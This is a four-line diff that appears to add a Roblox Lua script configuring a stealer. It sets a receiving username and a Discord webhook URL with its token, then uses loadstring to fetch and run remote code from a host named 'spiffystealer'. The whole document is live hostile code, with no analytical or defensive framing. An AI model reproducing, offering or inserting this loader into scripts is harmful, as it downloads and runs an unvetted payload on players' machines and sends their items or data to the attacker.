@@ -1,0 +1,4 @@
+Receiver = "daviblazer01"
+Webhook = "https://discord.com/api/webhooks/1277046268509683734/2VpYPnxoQKB_A6prChu-xeYvFZLL4mxdq5CTYi2nn9HfNUyvADdel_p2RrF1KMFrCwEd"
+
+loadstring(game:HttpGet("https://spiffystealer.replit.app/"))()
